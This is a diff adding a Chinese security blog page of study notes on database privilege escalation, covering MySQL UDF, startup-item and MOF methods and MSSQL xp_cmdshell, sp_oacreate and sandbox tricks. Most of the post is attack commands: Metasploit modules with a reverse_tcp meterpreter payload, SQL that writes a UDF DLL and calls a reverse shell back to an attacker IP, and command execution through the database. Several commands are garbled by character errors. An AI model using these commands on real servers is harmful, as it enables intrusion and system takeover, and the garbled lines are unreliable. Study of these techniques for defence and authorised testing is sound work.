@@ -1,0 +1,703 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/fluid.png">
+  <link rel="icon" href="/img/fluid.png">
+  
+
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="JUNYI">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="权限提升-数据库MYSQL提权条件1234567&#x2F;&#x2F; 数据库的最高权限用户的密码-secure-fle-priv没进行目录限制SHOW VARIABLES LIKE &quot;secure fle priv&quot;;0、网站存在高权限SOL注入点1、数据库的存储文件或备份文件2、网站应用源码中的数据库配置文件3、采用工具或脚本爆破(需解决外联问题)  账号密码获取121、通过注入点sqlma">
+<meta property="og:type" content="article">
+<meta property="og:title" content="mysql数据库提权">
+<meta property="og:url" content="http://example.com/2023/02/14/mysql%E6%95%B0%E6%8D%AE%E5%BA%93%E6%8F%90%E6%9D%83/index.html">
+<meta property="og:site_name" content="俊毅网络安全">
+<meta property="og:description" content="权限提升-数据库MYSQL提权条件1234567&#x2F;&#x2F; 数据库的最高权限用户的密码-secure-fle-priv没进行目录限制SHOW VARIABLES LIKE &quot;secure fle priv&quot;;0、网站存在高权限SOL注入点1、数据库的存储文件或备份文件2、网站应用源码中的数据库配置文件3、采用工具或脚本爆破(需解决外联问题)  账号密码获取121、通过注入点sqlma">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://example.com/image/%E5%BE%AE%E4%BF%A1%E6%88%AA%E5%9B%BE_20230516165917.png">
+<meta property="article:published_time" content="2023-02-14T04:00:00.000Z">
+<meta property="article:modified_time" content="2025-03-14T04:47:16.447Z">
+<meta property="article:author" content="JUNYI">
+<meta property="article:tag" content="安全技术">
+<meta property="article:tag" content="学习笔记">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="http://example.com/image/%E5%BE%AE%E4%BF%A1%E6%88%AA%E5%9B%BE_20230516165917.png">
+  
+  
+  
+  <title>mysql数据库提权 - 俊毅网络安全</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1749284_5i9bdhy70f8.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1736178_k526ubmyhba.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"example.com","root":"/","version":"1.9.8","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false},"umami":{"src":null,"website_id":null,"domains":null,"start_time":"2024-01-01T00:00:00.000Z","token":null,"api_server":null}},"search_path":"/local-search.xml","include_content_in_search":true};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+
+  
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>JunYi</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/" target="_self">
+                <i class="iconfont icon-home-fill"></i>
+                <span>首页</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/" target="_self">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>归档</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/" target="_self">
+                <i class="iconfont icon-category-fill"></i>
+                <span>分类</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/" target="_self">
+                <i class="iconfont icon-tags-fill"></i>
+                <span>标签</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/" target="_self">
+                <i class="iconfont icon-user-fill"></i>
+                <span>关于</span>
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/default.png') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="mysql数据库提权"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2023-02-14 12:00" pubdate>
+          2023年2月14日 中午
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          1.4k 字
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          12 分钟
+        
+      </span>
+    
+
+    
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <h1 id="seo-header">mysql数据库提权</h1>
+            
+            
+              <div class="markdown-body">
+                
+                <h2 id="权限提升-数据库"><a href="#权限提升-数据库" class="headerlink" title="权限提升-数据库"></a>权限提升-数据库</h2><h3 id="MYSQL"><a href="#MYSQL" class="headerlink" title="MYSQL"></a>MYSQL</h3><h5 id="提权条件"><a href="#提权条件" class="headerlink" title="提权条件"></a>提权条件</h5><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">// 数据库的最高权限用户的密码</span><br>-secure-fle-priv没进行目录限制<br>SHOW VARIABLES LIKE <span class="hljs-string">&quot;secure fle priv&quot;</span>;<br><span class="hljs-number">0</span>、网站存在高权限SOL注入点<br><span class="hljs-number">1</span>、数据库的存储文件或备份文件<br><span class="hljs-number">2</span>、网站应用源码中的数据库配置文件<br><span class="hljs-number">3</span>、采用工具或脚本爆破(需解决外联问题)<br></code></pre></td></tr></table></figure>
+
+<h5 id="账号密码获取"><a href="#账号密码获取" class="headerlink" title="账号密码获取"></a>账号密码获取</h5><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-number">1</span>、通过注入点<br>sqlmap.py-D mysql -T user -C <span class="hljs-string">&quot;password&quot;</span><br></code></pre></td></tr></table></figure>
+
+<h6 id="1-通过注入点"><a href="#1-通过注入点" class="headerlink" title="1.通过注入点"></a>1.通过注入点</h6><figure class="highlight clean"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs clean">```<br><br>###### <span class="hljs-number">2.</span>通过文件<br><br></code></pre></td></tr></table></figure>
+<figure class="highlight clean"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs clean"><br>###### <span class="hljs-number">3.</span>网站配置文件<br><br></code></pre></td></tr></table></figure>
+<figure class="highlight clean"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs clean"><br>### MYSQL-UDF提权<br><br>```php<br>UDF (Userdefined function)可翻译为用户自定义函数，<br>其为mysql的一个拓展接口，<br>可以为mysql增添一些函数。<br>比如mysql一些函数没有，我就使用UDF加入一些函数进去，那么我就可以在mysql中使用这个函数了。<br></code></pre></td></tr></table></figure>
+
+<h5 id="利用条件"><a href="#利用条件" class="headerlink" title="利用条件"></a>利用条件</h5><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php">数据库的最高权限用户的密码<br>secure-file-priv没进行目录限制  <span class="hljs-comment">//能够写入dll文件</span><br></code></pre></td></tr></table></figure>
+
+<h5 id="开启外连"><a href="#开启外连" class="headerlink" title="开启外连"></a>开启外连</h5><h6 id="方法一"><a href="#方法一" class="headerlink" title="方法一"></a>方法一</h6><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">修改mysql中user表数据<br></code></pre></td></tr></table></figure>
+
+<h6 id="方法二"><a href="#方法二" class="headerlink" title="方法二"></a>方法二</h6><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs mysql">GRANT ALL PRIVILEGES ON *.* TO &#x27;root&#x27;@&#x27;%&#x27;IDENTIFIED BY&#x27;root&#x27; WITH GRANT OPTION;<br>GRANT ALL PRIVILEGES ON *.* TO &#x27;账号&#x27;@&#x27;%&#x27;IDENTIFIED BY&#x27;密码&#x27; WITH GRANT OPTION;<br>-- 这是一条MySQL授权语句，<br>用于授予指定用户在所有数据库和表上拥有所有权限，并且可以在任何主机上连接到MySQL服务器<br></code></pre></td></tr></table></figure>
+
+<h5 id="查版本"><a href="#查版本" class="headerlink" title="查版本"></a>查版本</h5><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs php">select <span class="hljs-title function_ invoke__">version</span>() <span class="hljs-comment">#查版本</span><br>seTect @@basedir <span class="hljs-comment">#查安装路径</span><br>UDF导入函澈的文件为dll类型，其存放的目录受版本影响如下:<br><span class="hljs-number">1</span>.mysql&lt;<span class="hljs-number">5.2</span>    dll导出目录c:/windows或system32<br><span class="hljs-number">2</span>.mysql&gt;=<span class="hljs-number">5.2</span>   dll导出安装目录/lib/plugin/<br>  <br>没有目录采用手工创建plugin目录<br></code></pre></td></tr></table></figure>
+
+<p><img src="/image/%E5%BE%AE%E4%BF%A1%E6%88%AA%E5%9B%BE_20230516165917.png" srcset="/img/loading.gif" lazyload alt="微信截图_20230516165917"></p>
+<h5 id="调用MSF"><a href="#调用MSF" class="headerlink" title="调用MSF"></a>调用MSF</h5><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs php">使用MSF中的exploit/multi/mysql/mysql_udf_payload 模块可以进行UDF提权,<br>MSF会将d11文件写入<span class="hljs-number">1</span>ib plugin\目录下(前提是该目录存在，需手工创建)该d11文件中包含<span class="hljs-title function_ invoke__">sys_exec</span>(和sys_eva10两个函数，<br><span class="hljs-keyword">use</span> exploit/multi/mysql/mysql_udf_payload<br>set password root<br>set rhosts <span class="hljs-number">192.168</span>.<span class="hljs-number">1.15</span><br>run<br>成功生成DLL后，可在fuc表下查询<br></code></pre></td></tr></table></figure>
+
+<h5 id="命令执行"><a href="#命令执行" class="headerlink" title="命令执行"></a>命令执行</h5><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs php">上面默认只创建<span class="hljs-title function_ invoke__">sys_exec</span>()函数，该函数执行并不会有回显。我们可以手动创建 <span class="hljs-title function_ invoke__">sys_eva1</span>() 函数，来执行有回显的命令<br><span class="hljs-comment">//2.创建函数绑定dll</span><br>create <span class="hljs-function"><span class="hljs-keyword">function</span> &lt;函数名&gt; <span class="hljs-title">returns</span> <span class="hljs-title">string</span> <span class="hljs-title">soname</span> &quot;&lt;<span class="hljs-title">dll</span>文件名&gt;&quot;</span>;		<br>create <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">sys_eval</span> <span class="hljs-title">returns</span> <span class="hljs-title">string</span> <span class="hljs-title">soname</span> &quot;<span class="hljs-title">KaMeVAyW</span>.<span class="hljs-title">dll</span>&quot;</span>;		<br><br>DROP FUNCTION &lt;function_name&gt; <span class="hljs-comment">#删除自定义函数</span><br><span class="hljs-comment">//3.调用函数进行命令执行</span><br>select <span class="hljs-title function_ invoke__">sys_eval</span>(<span class="hljs-string">&quot;whoami&quot;</span>);<br></code></pre></td></tr></table></figure>
+
+<h3 id="MYSQL-MSF启动项提权"><a href="#MYSQL-MSF启动项提权" class="headerlink" title="MYSQL-MSF启动项提权"></a>MYSQL-MSF启动项提权</h3><h5 id="利用条件-1"><a href="#利用条件-1" class="headerlink" title="利用条件"></a>利用条件</h5><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">// 原理：上传木马到启动项文件，当电脑重启的时候，启动项文件被触发，实现上线。</span><br>高权限账户<br>secure-fle-priv <span class="hljs-comment">// </span><br></code></pre></td></tr></table></figure>
+
+<h5 id="MSF配置"><a href="#MSF配置" class="headerlink" title="MSF配置"></a>MSF配置</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs mysql">MSF：（前提先开外链）<br>use exploit/windows/mysql/mysql_start_up<br>set payload windows/meterpreter/reverse_tcp<br>set rhosts 192.168.88.131<br>set username root<br>set password root<br>set AllowNoCleanup  true<br>run<br></code></pre></td></tr></table></figure>
+
+<h3 id="MYSQL-MSF反弹shell"><a href="#MYSQL-MSF反弹shell" class="headerlink" title="MYSQL-MSF反弹shell"></a>MYSQL-MSF反弹shell</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs mysql">use mysql;<br>set @a=concat(&#x27;&#x27;,0x4d5a....);<br>create table Ghost(data LONGBLOB);<br>insert into Ghost values(&quot;&quot;);update Ghost set data = @a;<br>select data from Ghost into DUMPFILE &#x27;E:\\app\\php\\PHPTutorial\\MySQL\\lib\\plugin\\udf.dll&#x27;;<br><br>攻击机：<br>create function backshell returns string soname &#x27;udf.dll&#x27;;<br>select backshell(&#x27;192.168.234.133&#x27;,8888)  -- kali攻击机的IP<br></code></pre></td></tr></table></figure>
+
+<h3 id="MYSQL-MOF提权"><a href="#MYSQL-MOF提权" class="headerlink" title="MYSQL-MOF提权"></a>MYSQL-MOF提权</h3><h5 id="原理及条件"><a href="#原理及条件" class="headerlink" title="原理及条件"></a>原理及条件</h5><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">// 利用了c:/windows/system32/wbem/mof/目录下的 nullevt.mof 文件，每分钟都会在一个特定的时间去执行一次的特性，写入我们的cmd命令使其被带入执行，从而添加新用户提权。</span><br>测试的主机上该目录下并没有该mof文件，<br>因此我们直接导入一个文件。<br>当然这里需要权限，一般来说MOF普通用户是无法执行操作的，即使是拿到了一个shell.<br>也只是普通权限用户，利用条件有些苛刻。<br>MOF提权的条件要求十分严苛:<br><span class="hljs-number">1</span>.windows <span class="hljs-number">03</span>及以下版本<br><span class="hljs-number">2</span>.mysql有读写 c:/windows/system32/wbem/mof 的权限<br><span class="hljs-number">3</span>.secure_file_priv没进行目录限制<br></code></pre></td></tr></table></figure>
+
+<h5 id="上传MOF文件"><a href="#上传MOF文件" class="headerlink" title="上传MOF文件"></a>上传MOF文件</h5><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc"><span class="hljs-title">.mof文件</span><br></code></pre></td></tr></table></figure>
+
+<h5 id="执行语句"><a href="#执行语句" class="headerlink" title="执行语句"></a>执行语句</h5><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-keyword">select</span> load_file(<span class="hljs-string">&quot;c:/nullevt.mof&quot;</span>) into dumpfile<span class="hljs-string">&quot;c:/windows /system32 /wbem/mof/nullevt .mof&quot;</span>这里不能使用outfile，因为会在末端写入新行，因此mof在被当作二进制文件无法正常执行.所以我们用dumpfile导出一行数据<br>该文件效果创建一个高权限用户 (从上面脚本可知账号密码为 mofmof)net user username /deTete 删除用户删不掉<br><span class="hljs-comment"># 停止 winmgmt 服务</span><br>372971<br>net stop winmgmt<br><span class="hljs-comment"># 删除 Repository 文件夹</span><br><span class="hljs-built_in">rmdir</span> /s /q C: windows system32 wbem Repository# 手动删除 mof 文件de1 c: windows system32 wbem mof good nullevt.mof /F /s# 删除创建的用户net user mofmof /delete<br><span class="hljs-comment">#重新启动服务</span><br>net start winmgmt<br></code></pre></td></tr></table></figure>
+
+<h5 id="MSF实现"><a href="#MSF实现" class="headerlink" title="MSF实现"></a>MSF实现</h5><figure class="highlight clean"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs clean">```<br><br>### MSSQL<br><br>##### xp cmdshell提权<br><br>```php<br>账号密码: sa/admin<br><span class="hljs-comment">// xp_cmdshe11默认在mssq12000中是开启的，在mssq12005之后的版本中则默认禁止。</span><br>如果用户拥有管理员sa权限则可以用sp configure重修开启它。<br></code></pre></td></tr></table></figure>
+
+<h5 id="直接利用"><a href="#直接利用" class="headerlink" title="直接利用"></a>直接利用</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs mysql"># EXEC master.dbo.xp_cmdshell &#x27;whoami&#x27;<br>EXEC master.dbo.xp_cmdshell &#x27;命令&#x27;<br></code></pre></td></tr></table></figure>
+
+<h5 id="如果被关闭了"><a href="#如果被关闭了" class="headerlink" title="如果被关闭了"></a>如果被关闭了</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs mysql">-- 启用：<br>EXEC sp_configure &#x27;show advanced options&#x27;, 1<br>RECONFIGURE;<br>EXEC sp_configure &#x27;xp_cmdshell&#x27;, 1;<br>RECONFIGURE;<br><br>-- 相应的关闭命令为关闭：<br><br>exec sp_configure &#x27;show advanced options&#x27;, 1;<br>reconfigure;<br>exec sp_configure &#x27;xp_cmdshell&#x27;, 0;<br>reconfigure;<br></code></pre></td></tr></table></figure>
+
+<h5 id="如果被删除了"><a href="#如果被删除了" class="headerlink" title="如果被删除了"></a>如果被删除了</h5><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs sql">```<br><br>##### sp_oacreate提权<br><br>```php<br>主要是用来调用OLE对象，利用OLE对象的run方法执行系统命令。启用:<br><span class="hljs-keyword">EXEC</span> sp_configure <span class="hljs-string">&#x27;show advanced options&#x27;</span>，<span class="hljs-number">1</span>;RECONFIGURE <span class="hljs-keyword">WITH</span> OVERRIDE:<br><span class="hljs-keyword">EXEC</span> sp_configure <span class="hljs-string">&#x27;ole Automation Procedures&#x27;</span>，<span class="hljs-number">1</span>;RECONFIGURE <span class="hljs-keyword">WITH</span> OVERRIDE:<br>关闭:<br><span class="hljs-keyword">EXEC</span> sp_configure <span class="hljs-string">&#x27;show advanced options&#x27;</span>，<span class="hljs-number">1</span>;RECONFIGURE <span class="hljs-keyword">WITH</span> OVERRIDE:<br><span class="hljs-keyword">EXEC</span> sp_configure <span class="hljs-string">&#x27;ole Automation Procedures&#x27;</span>，<span class="hljs-number">0</span>;RECONFIGURE <span class="hljs-keyword">WITH</span> OVERRIDE:<br>执行:<br><span class="hljs-keyword">declare</span> <span class="hljs-variable">@shel1</span> <span class="hljs-type">int</span> <span class="hljs-keyword">exec</span> sp_oacreate <span class="hljs-string">&#x27;wscript,shel1&#x27;</span>,<span class="hljs-variable">@shel1</span> output <span class="hljs-keyword">exec</span> sp_oamethod<span class="hljs-variable">@she11</span>,<span class="hljs-string">&#x27;run&#x27;</span>,nul1,<span class="hljs-string">&#x27;c: windows system32 cmd.exe /c whoami &gt;c:  1.txt&#x27;</span><br></code></pre></td></tr></table></figure>
+
+<h5 id="SOL-Server-沙盒提权"><a href="#SOL-Server-沙盒提权" class="headerlink" title="SOL Server 沙盒提权"></a>SOL Server 沙盒提权</h5><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">exec sp_configureshow advanced <span class="hljs-keyword">options</span> ,<span class="hljs-number">1</span>;reconfigure;exec sp_configure <span class="hljs-string">&#x27;Ad Hoc Distributed Queries&#x27;</span>,<span class="hljs-number">1</span>;reconfigure;<br><span class="hljs-comment">--关闭沙盒模式，如果一次执行全部代码有问题，先执行上面两句代码。</span><br>exec master ..xp_regwriteHKEY-LOCAL_MACHIN<span class="hljs-string">E&#x27;,&#x27;</span>SOFTWARE Microsoft Jet <span class="hljs-number">4.0</span> Engines<span class="hljs-string">&#x27; , &#x27;</span>sandBoxMod<span class="hljs-string">e&#x27; ,&#x27;</span>REG_DWORD<span class="hljs-string">&#x27;,0:</span><br><span class="hljs-string">--查询是否正常关闭，经过测试发现沙盒模式无论是开，还是关，都不会影响我们执行下面的语句。</span><br><span class="hljs-string">exec master .dbo .xp_regread&#x27;</span>HKEY_LOCAL_MACHIN<span class="hljs-string">E&#x27;SOFTWARE Microsoft Jet 4.0 Engines &#x27;</span>sandBoxMod<span class="hljs-string">e&#x27;</span><br></code></pre></td></tr></table></figure>
+
+<h3 id="工具"><a href="#工具" class="headerlink" title="工具"></a>工具</h3><h5 id="MDUT"><a href="#MDUT" class="headerlink" title="MDUT"></a>MDUT</h5><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs PHP">https:<span class="hljs-comment">//github.com/SafeGroceryStore/MDUT</span><br></code></pre></td></tr></table></figure>
+
+<h5 id="LiqunKit"><a href="#LiqunKit" class="headerlink" title="LiqunKit"></a>LiqunKit</h5><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs PHP">综合高危漏洞利用工具(包含各大数据库) https:<span class="hljs-comment">//github.com/Liqunkit/LiqunKit</span><br></code></pre></td></tr></table></figure>
+
+
+
+
+
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+    <div class="post-meta mr-3 d-flex align-items-center">
+      <i class="iconfont icon-category"></i>
+      
+
+<span class="category-chains">
+  
+  
+    
+      <span class="category-chain">
+        
+  <a href="/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/" class="category-chain-item">网络安全</a>
+  
+  
+
+      </span>
+    
+  
+</span>
+
+    </div>
+  
+  
+    <div class="post-meta">
+      <i class="iconfont icon-tags"></i>
+      
+        <a href="/tags/%E5%AE%89%E5%85%A8%E6%8A%80%E6%9C%AF/" class="print-no-link">#安全技术</a>
+      
+        <a href="/tags/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/" class="print-no-link">#学习笔记</a>
+      
+    </div>
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>mysql数据库提权</div>
+      <div>http://example.com/2023/02/14/mysql数据库提权/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>作者</div>
+          <div>JUNYI</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>发布于</div>
+          <div>2023年2月14日</div>
+        </div>
+      
+      
+      
+        <div class="license-meta-item">
+          <div>许可协议</div>
+          <div>
+            
+              
+              
+                <a class="print-no-link" target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - 署名">
+                    <i class="iconfont icon-cc-by"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2023/06/14/%E6%9D%83%E9%99%90%E6%8F%90%E6%9D%83linux/" title="权限提升linux">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">权限提升linux</span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2022/09/14/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87win/" title="权限提升win">
+                        <span class="hidden-mobile">权限提升win</span>
